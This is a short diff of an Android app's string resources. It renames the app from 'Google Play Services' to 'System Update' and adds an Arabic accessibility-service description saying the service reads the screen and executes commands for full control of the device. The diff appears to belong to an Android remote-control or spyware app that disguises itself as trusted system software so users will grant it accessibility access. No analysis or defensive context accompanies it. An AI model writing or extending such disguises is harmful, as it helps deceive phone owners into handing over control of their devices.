@@ -1,4 +1,5 @@
+<?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Google Play Services</string>
-    <string name="accessibility_service_description">V13 Accessibility Service</string>
+    <string name="app_name">System Update</string>
+    <string name="accessibility_service_description">هذه الخدمة تمكن التطبيق من قراءة الشاشة وتنفيذ الأوامر للتحكم الكامل بالجهاز</string>
 </resources>
